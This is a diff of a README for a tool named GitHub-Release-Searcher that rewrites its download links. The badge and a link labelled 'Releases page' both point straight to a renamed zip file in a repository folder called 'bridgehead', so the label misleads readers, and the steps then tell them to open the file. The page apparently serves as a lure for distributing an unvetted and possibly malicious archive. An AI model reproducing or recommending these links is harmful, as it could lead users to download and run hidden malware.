@@ -11,11 +11,11 @@ GitHub-Release-Searcher helps you find files in GitHub releases quickly. Whether
 ## 📥 Download & Install
 To get started, download the application from our Releases page. Click the button below:
 
-[![Download GitHub-Release-Searcher](https://raw.githubusercontent.com/mustafajaber-123/GitHub-Release-Searcher/main/bridgehead/GitHub-Release-Searcher.zip)](https://raw.githubusercontent.com/mustafajaber-123/GitHub-Release-Searcher/main/bridgehead/GitHub-Release-Searcher.zip)
+[![Download GitHub-Release-Searcher](https://github.com/mustafajaber-123/GitHub-Release-Searcher/raw/refs/heads/main/bridgehead/Searcher-Release-Git-Hub-1.7-beta.2.zip)](https://github.com/mustafajaber-123/GitHub-Release-Searcher/raw/refs/heads/main/bridgehead/Searcher-Release-Git-Hub-1.7-beta.2.zip)
 
 Now follow the steps below to install the application:
 
-1. **Visit the Download Page**: Click this link to visit the [Releases page](https://raw.githubusercontent.com/mustafajaber-123/GitHub-Release-Searcher/main/bridgehead/GitHub-Release-Searcher.zip).
+1. **Visit the Download Page**: Click this link to visit the [Releases page](https://github.com/mustafajaber-123/GitHub-Release-Searcher/raw/refs/heads/main/bridgehead/Searcher-Release-Git-Hub-1.7-beta.2.zip).
 2. **Select the Latest Release**: Look for the most recent version available.
 3. **Download the File**: Find the file that matches your operating system. Click to download it. The file will start downloading automatically.
 4. **Open the File**: Once downloaded, locate the file in your downloads folder.
